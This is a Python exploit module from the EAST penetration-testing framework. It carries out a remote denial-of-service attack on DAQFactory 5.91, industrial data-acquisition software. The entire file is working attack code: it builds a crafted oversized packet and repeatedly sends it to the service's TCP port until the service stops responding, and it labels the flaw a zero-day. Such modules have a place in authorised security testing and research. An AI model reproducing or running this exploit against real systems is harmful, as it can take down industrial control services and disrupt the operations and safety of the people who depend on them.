#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import socket

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_daqfactory_dos"
INFO['DESCRIPTION'] = "DAQFactory <= 5.91  Remote Denial Of Service Exploit"
INFO['VENDOR'] = "http://www.azeotech.com/daqfactory.php"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ''
INFO["CVE Name"] = "0-Day"
INFO["NOTES"] = """
Tested on: DAQFactory 5.91
"""

INFO['CHANGELOG'] = "08 Nov, 2014. Written by Gleg team."
INFO['PATH'] = 'Exploits/DoS/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 2348

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = None
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
        
    def makesploit(self):
        return '\x40\x00\x00\x00\x32\x00\x00\x00' + '\x4a' * 3000
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        t = 0
        while(t <= 2048):
            try:
                self.log("Sending Exploit (packet number %d)"%t)
                s = socket.socket()
                s.settimeout(0.01)
                s.connect((self.host, self.port))
                pkt = self.makesploit()
                s.sendall(pkt)
                s.close()  
                #time.sleep(1)
            except:
                self.log("Attack reported no open socket - service died?")
                #self.log("Waiting and continue DoS....")
                self.finish(True)
                return 1
            t = t + 1

        self.log("Finished this exploit")
        self.finish(False)
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
